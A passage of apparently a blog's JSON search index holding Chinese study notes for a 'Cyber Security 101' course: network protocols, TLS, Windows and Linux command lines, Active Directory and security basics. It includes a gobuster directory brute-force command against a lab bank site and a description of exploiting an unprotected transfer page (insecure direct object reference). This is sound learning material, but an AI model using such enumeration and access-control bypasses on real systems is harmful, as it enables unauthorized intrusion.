PASS用于输入密码 RETR（retrieve）用于从FTP服务器下载文件到客户端。 STOR(store) 用于将文件从客户端上传到FTP服务器。 FTP服务器默认监听TCP端口 21；数据传输通过从客户端到服务器的另一个连接进行。 SMTP：发送电子邮件POP3：接收电子邮件IMAP：同步电子邮件第四部分 网络安全协议TLS（ transport Layer Security）安全套接字层 (SSL) 和传输层安全性 (TLS) 是用于加密客户端（例如 Web 浏览器）与服务器之间交换数据的协议。SSLTLS 可视为一种封装，它加密各种通信协议（例如HTTP和FTP），从而创建 HTTPS 和 FTPS。SSL 如今已不常用，因为 TLS 已逐渐取代它。 TLS 是传输层的加密协议，允许客户端和服务器在不安全的网络上进行安全通信。这里的 安全 指机密性、完整性 SSLTLS工作流程SSLTLS 握手用于通过以下步骤加密客户端与服务器之间的通信： 客户端问候消息：客户端向服务器发送问候消息，包含客户端支持的 TLS 版本、密码套件以及随机字节。 服务器问候消息：服务器回复问候消息，提供其证书、选定的密码套件和随机字节。 认证：客户端通过发行证书的证书颁发机构验证服务器的证书。例如，访问Google时，Google会分享其证书，浏览器通过预装的证书颁发机构证书进行验证。 预主密钥：客户端使用服务器的公钥（从服务器证书中获取）加密随机字节。 预主密钥解密：服务器使用其私钥解密预主密钥。 会话密钥生成：客户端和服务器基于客户端随机字节、服务器随机字节和预主密钥生成会话密钥。双方将得到相同的结果； 此会话密钥不传输，加密和解密基于此密钥。 准备消息：客户端和服务器使用会话密钥发送“完成”消息，表示会话已准备好传输。此时，客户端和服务器可以通过SSLTLS加密连接交换消息。 HTTPSSMTPS、POP3S、IMAPSSSHSFTP、FTPSVPN第五部分 WireShark第六部分 Tcpdump第七部分 Nmap","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第四部分 命令行","path":"/Cyber-Security-101-4/","content":"介绍 Windows 命令行和MS PoweShell，以及 Linux 操作系统中 Bash 的用法，包括编写 Shell 脚本 cmdCMD命令属于批处理语言（Batch Script），是一种基于 Windows 命令行环境的脚本语言。 Windows环境下默认命令行解释器是 cmd.exe 基本系统信息set # 检查路径ver # 确定操作系统版本systeminfo # 系统信息介绍cls # 清理cmd屏幕# 命令 | more # 一页一页输出 网络故障排除ipconfig # 检查网络信息，后可加/allping example.com # 检查服务器是否可访问tracert example.com # 跟踪到达目标所经过的网络路由nslookup example.com # 查找主机/域并返回其IP地址netstat # 显示当前网络连接和监听端口# -a显示所有已建立的连接和监听端口# -b显示与每个监听端口和已建立的连接相关的程序# -o显示与连接关联的进程 ID ( PID )# -n使用数字形式表示地址和端口号 文件和磁盘管理cd # 不带参数：显示当前驱动器和目录# 带参数（文件夹路径）：切换目录dir # 查看子目录 # /a 显示隐藏文件 # /s 显示当前目录和子目录所有文件tree # 以直观方式标识目录和子目录mkdir # 创建目录 makermdir # 删除目录 removetype # 查看文本文件内容copy # 复制文件move # 移动文件del # 删除文件erase # 删除文件 可以使用通配符 * 引用多个文件 # 将所有md文件复制到目录copy *.md C:\\Markdown 任务和流程管理tasklist # 列出正在运行的进程，支持筛选tasklist /？ # 查看帮助页面# 查找与notepad.exe相关进程tasklist /FI imagename eq notepad.exe taskkill /PID target_pid # 终止进程 其他命令chkdsk # 检查文件系统和磁盘卷 是否存在错误和坏扇区driverquery # 显示已安装的设备驱动程序列表sfc /sacnnow # 扫描系统文件是否有损坏，并尽可能修复 shutdown /? # 关机、重启、注销等等 PowerShellPowerShell 是一种功能更强大的脚本语言，基于 .NET 框架，专为 Windows 系统管理设计。 面向对象，可以处理复杂数据类型并与系统组件交互 基本语法PowerShell 命令 被称为cmdlets ，遵循一致的Verb-Noun命名约定 使用 Get-Command 查看所有 cmdlet，Alias，Function 使用 Get-Help 命令 可获得命令使用帮助 Get-Alias # 列出所有可使用的别名Get-Command -CommandType Function # 获取函数命令列表Get-Command -Verb Remove # 动词为 Remove 的命令Get-Command -Name Remove* # 使用通配符，同样查询以 Remove 开头的命令 PowerShell 还可以从在线存储库下载其他 cmdlet 来扩展其功能 Find-Module -Name “name” Install-Module -Name “name” 文件系统Get-ChildItem # 浏览目录并查看内容Set-Location # 更改当前目录New-Item -Path .\\file -ItemType Directory # 创建文件夹New-Item -Path .\\text.txt -ItemType File # 创建文件Remove-Item # 删除目录/文件Copy-Item # 相当于copyMove-Item # 相当于moveGet-Content # 相当于cat 管道运输、过滤、排序Get-ChildItem | Sort-Object LengthGet-ChildItem | Where-Object -Property Extension -eq .txt Get-ChildItem | Where-Object -Property Name -like ship* 管道运输符 | 将 Get-ChildItem 的执行结果 传输到后面 Get-ChildItem | Where-Object -Property Length -gt 10 # 筛选大于10的项目Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1 # 找出最大的项目 系统和网络信息Get-ComputerInfo # 查询全面的系统信息Get-LocalUser # 列出所有本地用户账户Get-NetIPConfiguration # 系统网络接口信息Get-NetIPAddress # 系统网络IP地址信息 实时系统分析Get-Process # 显示所有运行进程Get-Service # 显示所有服务Get-NetTCPConnection # 显示当前TCP连接Get-FileHash # 生成文件哈希 Get-FileHash -Path .\\ship-flag.txt # 生成文件哈希 脚本 对于事件响应人员、恶意软件分析师和威胁猎手等蓝队专业人员来说， PowerShell脚本可以自动执行许多不同的任务，包括日志分析、检测异常和提取入侵指标 (IOC)。这些脚本还可用于对恶意代码（恶意软件）进行逆向工程或自动扫描系统以查找入侵迹象。 对于红队（包括渗透测试人员和道德黑客）而言，PowerShell脚本可以自动执行诸如系统枚举、执行远程命令以及编写混淆脚本以绕过防御等任务。它与所有类型的系统深度集成，使其成为模拟攻击和测试系统抵御现实威胁能力的强大工具。 在网络安全的背景下，系统管理员可以利用PowerShell脚本自动执行完整性检查、管理系统配置和保护网络，尤其是在远程或大规模环境中。PowerShell脚本可以用于强制执行安全策略、监控系统健康状况并自动响应安全事件，从而增强整体安全态势。 编写脚本难度很高，暂时略过 Invoke-Command 它能够实现高效的远程管理，并结合脚本功能，实现跨多台计算机的任务自动化。此外，它还可用于在渗透测试人员（或攻击者）的攻击过程中在目标系统上执行有效载荷或命令。 Invoke-Command -ComputerName Server01 -Credential Domain01\\User01 -ScriptBlock Get-Service -Credential指凭据。远程连接设备 server01 并执行Get-service Linux Shell基础命令 pwdcd Filelscat filename.txtgrep THM file.txt # 在文本文件中搜索THM Linux Shell有多种类型 echo $SHELL # 查看当前Shell类型cat /etc/shells # 列出系统中可以用的终端 Bash 、 Fish 、 Zsh三种 Shell ： history # 查看命令历史记录# 上下键切换历史命令 Shell脚本创建一个Bash 脚本 frist_script.sh，扩展名为 .sh 首行 定义 脚本执行解释器 #!/bin/bash echo Hello,Whats your name?read nameecho Welcome,$name 使用 bash 执行 bash frist_script.sh 授予脚本执行权限然后直接执行 chmod +x frist_script.sh./frist_script.sh 变量your_name=yang # 变量名和等号间不能有空格echo $your_name # 使用变量需要加上 $echo $your_name # 帮助解释器识别变量的边界readonly your_name # 声明变量只读，后续无法修改unset your_name # 删除变量，但不能删除只读变量 变量类型：字符串、整数、数组、环境变量、特殊变量 my_string=Hello # 或单引号，或不用引号declare -i my_integer=42 # 声明变量为整数my_array=(1 2 3 4 5) echo $PATH # PATH是环境变量，包含了操作系统搜索可执行文件的路径 特殊变量： $0 表示脚本名称 ，$1、 $2 表示脚本参数 $# 表示传递给脚本的参数数量，$? 表示上一个命令的退出状态等 字符串变量，双引号内可以使用变量、转义字符，而单引号内所有内容都会原样输出 your_name=yangstring=Hello,$your_name ! # 字符串拼接（单引号也一样）echo $string read name # 接收用户的输入，存储在变量nameecho $#name # 获取字符串长度，$#name 等价于 $#name[0]echo $#name:1:3 # 从第2个字符开始截取3个字符 echo $array_name[@] # 获取数组中的所有元素 传递参数执行一个脚本，传递 1、2、3 三个参数 bash test.sh 1 2 3 在脚本内部，使用 $0 表示脚本名称 ，$1、 $2 、$3表示脚本参数 还可以用$# 表示传递给脚本的参数数量，$? 表示上一个命令的退出状态 $* 显示所有参数 $$ 获取脚本运行的当前进程ID Shell运算符介绍算术运算符、关系运算符、逻辑运算符 原生bash不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。 expr 是一款表达式计算工具，使用它能完成表达式的求值操作。 val=`expr 2 + 2` 常用算术运算符：+ - * / % = == != 关系运算符只支持数字，不支持字符串，除非字符串的值是数字。 常用关系运算符：-eq -ne -gt -lt -ge --le if [ $a -eq $b]then echo $a -eq $b : a 等于 belse echo $a -eq $b : a 不等于 bfi 逻辑运算符 || 还有字符串运算符、文件测试运算符、自增自减运算符等等 也可以使用 (()) 进行算术运算，也可直接使用 echoecho -n Loading... # 不换行输出echo -e First line Second line # 启用转义字符echo hello output.txt # 输出到文件并覆盖， 是追加# 彩色文本，\\033[0m 重置属性，42绿背景，31红字echo -e \\033[42;31mGreen Background with Red Text\\033[0m printf暂时略过 条件if conditionthen command1 command2 ... commandN else commandfi 代码块不可为空，要么就不写 else if condition1then command1elif condition2 then command2else commandNfi 循环#!/bin/bashfor i in 1..10;doecho $idone while conditiondo commanddone until conditiondo commanddone break 跳出所有循环 continue 跳出当前循环 case $value in value1) command1 command2 ... commandN ;;value2) command1 command2 ... commandN ;;esac Shell函数[ function ] funname [()] action; [return int;] 函数调用，像脚本一样传参 funname 1 2 3 示例： #!/bin/bashfunction demoFun1() echo 这是我的第一个 shell 函数! return `expr 1 + 1`demoFun1echo $?echo $? 第一个 echo 显示函数返回值2 第二个 echo 显示上一条命令正确执行的返回值 0 Shell 输入输出重定向 Shell 文件包含Shell 可以包含外部脚本 source ./test1.sh# 或. ./test1.sh","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第三部分 AD和Windows基础知识","path":"/Cyber-Security-101-3/","content":"先介绍Active Directory基础知识 再介绍 Windows 的 NTFS 文件系统、UAC权限控制、系统配置、资源监控、注册表以及安全相关功能。 第一部分 Active DirectoryActive Directory是Windows服务器环境中的目录服务。几乎任何中大型企业为了集中化管理，都会部署AD 本质上 AD 是一个分层式的、分布式的数据库，用于存储、组织并提供对网络环境中各种对象和资源信息的访问。 其核心协议是实现身份认证和授权的 LDAP (Lightweight Directory Access Protocol)。 逻辑结构： 域 Domain：使用DNS域名标识，是一个安全对象的集合，这些对象共享目录数据库和安全策略 树 Tree：一个或多个域的层次化组合，这些域共享一个连续的 DNS 命名空间 林 Forest：包含一个或多个共享共同架构 (Schema) 和全局编录 (Global Catalog) 的域。林内的所有域通过可传递的信任关系自动建立双向信任。 组织单位 OU：域内组织对象的最小单位，是应用组策略和委派管理权限的最小作用域单位。 物理结构： 域控制器 DC：运行Active Directory 服务的服务器 站点 Site Active Directory用户：用户是安全主体之一，是可以对网络中的资源进行操作的对象。 人员用户：用户通常代表组织中需要访问网络的人员，例如员工。 服务用户：每个服务都需要一个用户才能运行，这就是服务用户，只拥有运行特定服务所需的权限。 机器：每台加入 Active Directory 域的计算机都会创建一个计算机对象。计算机也被视为“安全主体”，机器账户本身指计算机的本地管理员。通常 计算机名称+$ 就是机器账户名。 安全组：类似用户组，可用于向用户授予特定权限。如域管理员、服务器操作员、备份操作员、账户操作员、域用户、域计算机、域控制器 登录域控制器，运行 Active Directory Users and Computers 。 组织单位 OU ：容器对象，可用于对用户和计算机进行分类。一个用户一次只能属于一个 OU 如图，THM 组织单元有5个子组织单元。图中四个用户 同属于 Sales 组织单元 OU 是应用组策略和委派管理权限的最小作用域单位。 组策略销售所需要的权限是相同的，应该给销售人员统一配置权限。 根据不同需要可以给不同 OU 分别配置不同权限策略，这就是组策略。 使用Group Policy Management工具查打开 组策略 配置操作界面 在 Group Policy Objects 目录下 创建组策略，然后就可以链接到其他 组织单元 （子组织单元也会影响） 图中 GPO 内有三个组策略，已经应用于 OU Security Filtering ：安全筛选，默认情况下组策略会应用到所有安全对象 Settings 栏里可以看到具体包含哪些权限 修改组策略，右键 选中 Edit，会弹出包含许多条目的新界面，如图 组策略分发域控制器上一个名为 SYSVOL 的特定网络共享文件夹，存放有 组策略对象 数据。 DC 上的默认路径：C:\\Windows\\SYSVOL\\sysvol\\ 域内的用户可以通过 域名\\SYSVOL 来访问 域成员会定期联系 DC 查询是否 需要更新GPO 也可以在 PoweShell 使用gpupdate /force来立即更新 Delegation 权限委派授予用户特定权限，让他们能在 OU 上执行高级任务，而无需域管理员介入。 右键 需要委派给其他人的 OU，选择 Delegate Control ，进入新界面进行具体操作。 被委派的用户由于没有打开 Active Directory Users and Computers 的权限，需要使用Powershell来执行操作。 设备管理身份验证Windows域中的网络身份验证 都需要 域控制器DC 来验证配置是否正确 使用两种协议： Kerberos：新的默认协议 NetNTLM：旧的身份验证协议，仍然兼容 KerberosKerberos 是 Windows 域环境中默认的身份验证协议，依赖于 KDC（密钥分发中心），通常运行在域控制器（DC）上。KDC 包含两个主要服务： 认证服务（AS，Authentication Service）：负责验证用户身份并颁发 TGT（Ticket Granting Ticket）。 票据授予服务（TGS，Ticket Granting Service）：根据 TGT 颁发特定服务的 服务票据（Service Ticket）。 TGT 作为用户身份的通用凭证，允许用户在有效期内多次请求服务票据 Kerberos 工作流程简述： 用户通过用户名和密码（或密钥）向 KDC 的认证服务（AS）请求身份验证。 KDC 验证用户身份后，返回一个 TGT，该票据包含用户的身份信息和时间戳，加密后存储在客户端。 当用户需要访问特定服务时，客户端使用 TGT 向 KDC 的票据授予服务（TGS）请求 服务票据。 TGS 返回一个针对特定服务的 服务票据，用户出示该票据给目标服务，服务验证票据后授予访问权限。 票据有效期：TGT 和服务票据都有时间限制（通常为 10 小时），到期后需续期或重新认证。 NetNTLMNetNTLM（也称为 NTLM，NT LAN Manager）是 Windows 域环境中较旧的身份验证协议，通常作为 Kerberos 的备用协议，用于不支持 Kerberos 的场景或向下兼容旧系统。 仅做介绍 树、林、信任关系AD支持集成多个域，将网络划分为可独立管理的单元。 树的每个域都有各自的 DC ，有各自的域管理员，以及可以控制企业中所有内容的 企业管理员。 不同的命名空间 也可以 统一管理。 将多个具有不同命名空间的树合并到同一个网络中，这种结构称为林 双向信任关系是域之间的一种认证机制，允许用户跨域被识别和授权，但它本身并不自动授予资源访问权限。 管理员需要进一步配置具体的访问权限，以决定哪些用户可以访问哪些资源，从而实现安全的资源共享和跨域协作。 第二部分 文件系统与权限文件系统：NTFSNTFS 被称为日志文件系统，发生故障可以使用日志中的信息自动修复磁盘上的文件 权限设置 Read Write Read Execute List Folder Contents Modify Full Control 继承性：子文件夹和文件继承父文件夹的权限 显式权限：可以为特定文件及文件夹设置独立权限，覆盖继承的权限 备用数据流ADS每个文件至少有一个默认数据流 $DATA，ADS 允许文件附加额外的命名数据流，与主数据流并存，可以存储独立的数据。 元数据存储：Windows 常使用 ADS 存储文件的元数据，如文件的摘要信息或缩略图。 安全和隐藏数据：ADS 可用于隐藏数据（例如，恶意软件可能利用 ADS 隐藏恶意代码）。 Windows\\System32C:\\Windows 即包含操作系统的文件夹，环境变量是 %windir% 环境变量存储有关操作系统环境的信息。此信息包括操作系统路径、操作系统使用的处理器数量以及临时文件夹的位置等详细信息 其中的 System32文件夹中的内容对操作系统至关重要。 账户 管理员：可以对系统进行更改。添加用户、删除用户、修改组、修改系统设置等。 标准用户：只能更改属于用户的文件夹文件，而不能执行系统级更改，例如安装程序。 创建用户账户时会为该用户创建一个配置文件。每个用户配置文件文件夹位于 C:\\Users。 每个用户配置文件都包含共同的文件夹：桌面、文件、下载、音乐、图片 在运行窗口：lusrmgr.msc 可以查看用户和群组的详细信息。 User Account Control（UAC）任意管理员用户都可以修改系统设置，引入 UAC 以限制权限滥用。 即管理员用户登录时，默认情况下会话不会以管理员权限运行。当需要执行需要更高级别权限的操作时，系统会提示用户确认是否允许该操作运行。 不适用于内置本地管理员账户，日常不会使用这个账户。 这就是一些安装程序图标右下角会有个盾牌的原因，因为它需要更高级别的权限来安装 UAC 可以设置控制强度 运行提示符：UserAccountControlSettings.exe 设置和控制面板设置日常使用更多 控制面板可以访问更复杂设置和执行复杂操作。 任务管理器Ctrl + Shift + Esc打开任务管理器 可以查看正在运行的程序、进程，以及性能、服务等详细信息。 第三部分 系统配置及相关工具简单介绍 系统配置MSConfig 程序（系统配置实用程序）用于高级故障排除，主要帮助诊断启动问题。 直接Windows搜索系统配置 常规：选择Windows启动时加载的设备和服务 引导：为操作系统定义各种启动选项 服务：列出系统配置的所有服务（服务是一种在后台运行的特殊应用程序） 启动：微软建议使用任务管理器来管理启动项 工具：列出各种实用程序，可以通过运行提示符（Win+R）、命令提示符和运行按钮来启动 运行提示符：control.exe 进入控制面板 计算机管理 compmgmt.msc 计算机管理实用程序 系统工具 任务计划程序：可以创建和管理常见任务，运行应用程序、脚本等，并且可以配置任务在任意时间点运行 事件查看器：可以记录五种类型的事件。这些事件记录可以被视为审计线索，用于了解计算机系统的活动。 共享文件夹：其他人可以连接的共享和文件夹的完整列表。 本地用户和组 性能：有 性能监视器 （perfmon）程序 设备管理器：查看和配置硬件，例如禁用连接到计算机的任何硬件。 存储 磁盘管理：执行高级存储任务，设置新驱动器、扩展或缩小分区、分配或更改驱动器号 服务和应用程序：可以查看服务 系统信息 msinfo32.exe 硬件资源：不懂硬件看不懂 组件：可以查看计算机上安装的硬件设备的具体信息 软件环境：可以查看操作系统内置软件以及您已安装软件的信息。此部分还显示其他详细信息，例如环境变量和网络连接。 资源监视器 resmon.exe 资源监视器显示每个进程以及CPU、内存、磁盘和网络使用情况的汇总信息，此外还提供有关哪些进程正在使用各个文件句柄和模块的详细信息。 高级筛选功能允许用户隔离与一个或多个进程（应用程序或服务）相关的数据，启动、停止、暂停和恢复服务，以及从用户界面关闭无响应的应用程序。它还包括一个进程分析功能，可以帮助识别死锁进程和文件锁定冲突 命令提示符 cmdhostname # 输出计算机名称whoami # 输出登录用户的名称ipconfig # 显示计算机的网络地址设置cls # 清除屏幕 clearnetstat # 显示协议统计信息和当前的 TCP/IP 网络连接net # 管理网络资源 使用 help (net help) 命令后加 /? 显示说明（net除外） 注册表编辑器 regedt32.exeWindows 注册表 是一个中央分层数据库，用于存储为一个或多个用户、应用程序和硬件设备配置系统所需的信息。 注册表包含 Windows 在运行期间不断引用的信息，例如： 每个用户的个人资料 计算机上安装的应用程序以及每个应用程序可以创建的文档类型 文件夹和应用程序图标的属性表设置 系统上有哪些硬件 正在使用的端口 第四部分 内置安全功能简单介绍 Windows更新Windows 更新是微软为 Windows 操作系统提供的补丁、功能更新和安全修复，旨在提升系统安全性、稳定性和性能。 更新可分为 安全更新、功能更新、质量更新、驱动更新 Windows 10 和 Windows 11 设计为强制更新，普通用户无法永久禁用更新，只能推迟。 WIndows安全 病毒和威胁防护 防火墙和网络保护 应用程序和浏览器控制 设备安全 病毒和威胁防护防火墙防火墙（Firewall）监控和控制通过端口进出的网络流量。检查每一个数据包，决定是允许通过、拒绝，还是丢弃。 Windows防火墙提供三种防火墙配置文件：域、私有和公共 域：域配置文件适用于主机系统可以向域控制器进行身份验证的网络。 私人：私人配置文件是用户分配的配置文件，用于指定私人或家庭网络。 公共：默认配置文件是公共配置文件，用于指定公共网络，例如咖啡店、机场和其他地点的 Wi-Fi 热点。 应用和浏览器控制设备安全 内核隔离：防止攻击将代码插入高安全性进程 安全处理器：使用可信平台模块 (TPM) 技术，提供基于硬件的安全相关功能。TPM 芯片是一种安全的加密处理器。该芯片包含多种物理安全机制，使其具有防篡改功能，恶意软件无法篡改 TPM 的安全功能 数据加密：BitLocker 驱动器加密是一种与操作系统集成的数据保护功能，可以解决丢失、被盗或不当退役的计算机造成的数据盗窃或泄露威胁 卷影复制服务 VSS该服务创建数据的一致性快照（也称为卷影副本或时间点副本）。这些快照可以在特定时间点捕获文件、文件夹或整个驱动器的数据状态，方便备份或恢复。 系统保护功能：通过VSS支持创建、配置和删除还原点，以及执行系统还原。 安全风险：勒索软件可能删除卷影副本，导致无法通过系统还原恢复数据。","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第二部分 Linux基础知识","path":"/Cyber-Security-101-2/","content":"介绍Linux基础知识：一些基本命令，使用SSH登录Linux设备，与文件系统交互，以及一些实用工具，进程，自动化，与包管理，日志相关知识 基本命令echo Hello # 输出提供的文本whoami # 输出当前登录的用户ls # 列出目录下的文件listing,默认参数是当前目录cd # 更改目录 change directorycat # 输出文件内容pwd # 打印完整工作目录路径 print working directory find -name passwords.txt # 在当前目录下查找文件find -name *.txt # 使用*来搜索所有txt文件 grep 81.143.211.90 access.log # 搜索文件内容，展示包含所需值的条目 # shell运算符 允许终端后台允许命令 将多个命令组合在一行 重定向 与相同，但是输出不覆盖而是添加在后面 echo Hello welcome # 将 Hello 输出到文本文件，内容将被覆盖echo World welcome # 将 World 添加到文本文件后（自动换行） 使用SSH登录Linux设备、执行命令、与文件系统交互 SSH（Secure Shell） ：连接远程Linux机器命令行并进行交互 ssh 账户用户名@远程机器IP地址# 然后还需输入密码 命令参数 ls -a # 将显示工作目录所有内容all，包括隐藏文件ls --help # manual使用帮助ls -lh # 列出当前目录下文件详细信息 long、human能阅读的方式 与文件系统交互 touch # 创建文件mkdir # make directory创建文件夹cp # copymv # moverm # removefile # 确定文件类型 rm note # 删除文件rm -R directory # 删除文件夹 cp note new_note # 复制时可以自动创建新文件 mv note new_note # 移动到新文件夹或新文件，不保留旧文件 file note # 确定文件类型 note: ASCII text # 表明是一个文本文件 权限ls -lh -rw-r--r-- 1 user group 4.5K Sep 2 14:30 example.txt drwxr-xr-x 2 user group 4.0K Sep 2 10:15 mydir 第1个字符：-普通文件，d目录，l符号链接 后9个字符：权限，分为三组，分别表示 文件拥有者权限、所属组权限、其他用户权限 硬链接数（如1或2）：普通文件通常为 1，目录为至少 2（包含自身和 . 目录）。 文件拥有者、文件所属组、文件大小、最后修改时间、文件名 切换用户需要知道用户名和密码 su 其他用户 Password:# 仅切换到目标身份，但保留当前用户的环境变量，且工作目录不变 su -l 用户名# 完全切换用户，并切换到HOME目录 目录 ETC：存储操作系统使用的系统文件 var：存储系统上运行的服务或应用经常访问或写入的数据，如日志文件/var/log root：root系统用户的主目录 tmp：用于存储只需访问几次的数据。重启将清除，任何用户默认都可以写入此文件夹，渗透测试中存储、枚举的理想场所 终端文本编辑器 nano vim 仅做了解 通用实用工具wgetwget 文件URL SCP（SSH）利用SSH协议在两台计算机之间传输文件，提供身份验证和加密 通过 SOURCE 和 DESTINATION 模型，SCP 允许您： 将文件和目录从当前系统复制到远程系统 scp test.txt user@IP_address:home/user/new.txt 将文件和目录从远程系统复制到当前系统 scp user@IP_address:home/user/test.txt new.txt WebPython3的“HTTPServer”会在当前目录进行文件服务 python3 -m http.server # 启动http服务（8000端口） wget http://10.10.135.215:8000/myfile 进程查看进程 所有进程（加上其他用户运行以及系统进程） ps aux top获取进程的实时统计信息 top 管理进程kill PID 在进程被终止时可以发送的一些信号： SIGTERM——终止进程，但允许它事先执行一些清理任务 SIGKILL - 终止进程 - 事后不做任何清理 SIGSTOP——停止暂停进程 进程的启动命名空间将进程彼此隔离，只有同一命名空间中的进程可以相互看到 PID为 0 的进程是系统启动时启动的 systemd是第一个启动的进程之一，管理系统进程的初始化系统。任何想要启动的进程都会作为 systemd 的子进程启动。 systemctl 是管理 systemd 服务的命令行工具，可以用于启用或停止、开机启用、禁止 服务 systemctl [option] [service]# start stop enable disable 前台和后台在命令中添加 会让进程在后台运行 CTRL + Z也可以将进程移到后台 fg 命令将后台进程重新带回前台（ foreground） 自动化cron 是一个 Linux 系统中的守护进程（daemon），在系统启动时自动运行，用于定时执行任务（称为 cron 作业，cron jobs）。 它根据预设的时间表（schedule）运行脚本、命令或程序，适合自动化任务，如定时备份、更新系统或启动应用程序。 使用 crontab（table）来管理定时任务 crontab -e # 编辑当前用户的crontabcrontab -l # 查看当前用户的crontab 格式 时 日 月 星期 命令 # *表示任意0 * * * * /usr/bin/google-chrome # 每个小时启动Google Chrome@reboot /var/opt/processes.sh # 系统启动或重启时执行脚本 包管理apt 是软件包管理命令，每当更新系统时，包含软件的仓库也会检查更新 apt updateapt install [software-name-here]apt remove [software-name-here] 仅做介绍 日志 varlogvar/log 存储各种日志 日志轮转：自动管理日志文件大小和存储，定期压缩旧日志、创建新日志、并删除过期日志 以三个日志为例： Apache2 Web服务器： /var/log/apache2/access.log：记录 Web 服务器的访问日志（每次 HTTP 请求的详细信息，如 IP、URL、状态码等）。 /var/log/apache2/error.log：记录 Apache2 的错误信息（如配置错误、页面未找到）。 fail2ban 服务：/var/log/fail2ban.log，记录 fail2ban 服务的运行状态和操作。 防止暴力破解，通过监控日志（如SSH登录）检测异常行为，并临时封禁异常IP UFW服务：/var/log/ufw.log，记录 UFW 防火墙的操作和事件。 仅做介绍","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第一部分 简介","path":"/Cyber-Security-101-1/","content":"介绍网络安全101课程，初步了解进攻性安全和防御性安全的概念，总结搜索技巧 Cyber Security 101本课程涵盖以下方面的基本概念和应用 计算机网络和密码学 MS Windows、Active Directory 和 Linux 基础知识 攻击性安全工具和系统利用 防御性安全解决方案和工具 网络安全职业 前面几部分是基础知识，网络安全相关部分在后面学习 进攻性安全进攻性安全是一种主动的安全测试方法，通过模拟黑客的攻击行为来识别和利用系统、应用程序或网络中的漏洞。其目标是发现潜在的安全弱点，从而在恶意攻击者利用之前进行修复。 示例：入侵一个 模拟的FakeBank： http://fake.bank.thm 使用 Gobuster 暴力查找银行所有页面 gobuster dir -u http://fake.bank.thm -w wordlist.txt # -u 声明正在扫描的网站# -w 采用单词列表遍历查找隐藏的页面 结果找到bank-transfer转账页面，状态200 OK，代表可以访问 访问http://fakebank.thm/bank-transfer 于是获取了转账权限（可以使用ID进行转账） 通过模拟黑客入侵银行系统，发现了未经授权就可以访问的转账页面 这是一种访问控制漏洞。具体来说是不安全的直接引用 通过操纵 URL 参数、表单数据或请求体中的标识符（如用户 ID、账户 ID 或交易 ID） 无需授权，直接访问或修改他人的资源 修复漏洞需要实施严格的访问控制检查 一个类似的漏洞示例： Optus 数据泄露（2022 年，澳大利亚电信巨头） https://www.upguard.com/blog/how-did-the-optus-data-breach-happen 报告总结了原因： 一个无需身份验证的API可以访问客户敏感信息 递增使用客户标识符（递增ID即可获取所有客户ID） GobusterGo语言编写的开源命令行工具 可以用于暴力枚举Web目录、文件、DNS子域名等 gobuster dir -u 网站域名 -w 爆破字典gobuster dns -d 网站域名 -w 爆破字典 后续进一步学习使用 防御安全简介防御安全：从保护、监控和维护的角度出发，通过收集情报、检测异常、响应威胁和修复漏洞来确保系统、应用程序和网络的安全。 与进攻性安全主动寻找漏洞不同，防御性安全侧重于构建和维护安全防线，防止攻击发生并在攻击发生时快速响应。 防御安全核心领域： Security Operations Center (SOC), where we cover Threat Intelligence 情报收集 Digital Forensics and Incident Response (DFIR), where we also cover Malware Analysis 数字取证、事件响应、恶意软件分析 事件响应流程： 现代安全管理使用 Security Information and Event Management (SIEM) 系统，这是一种集成的安全管理方案， 收集安全相关信息和事件并呈现，如果检测到可疑事件会发出警报 SIEM系统模拟： 多次登录失败不一定有问题，可能只是忘记密码 注意到 IP 143.110.250.149 尝试未授权登录，最终成功，这很可疑，利用一些网站查询该 IP。 查询结果显示非常可疑，并且登录成功，可能有危险，应该进行处理。选择 SOC Team lead ，负责初始的事件处理并报告，之后交给 DFIR 最后封锁这个IP 搜索技巧谷歌搜索: 双引号表示精确搜索 site: 限制域名 - 忽略特定词语 filetype:查找文件类型（而非网页） 专业搜索引擎： Shodan 搜索联网设备 Censys 搜索互联网资产 VirusTotal 文件病毒扫描服务 Have I Been Pwned 检测某个电子邮箱地址是否被泄露 常见漏洞CVE CVE系统，漏洞字典，用CVE ID标准化每个漏洞（https://nvd.nist.gov/） 漏洞数据库，可以找到来自不同作者的漏洞利用代码 查阅官方文档","categories":["Cyber Security 101"]}]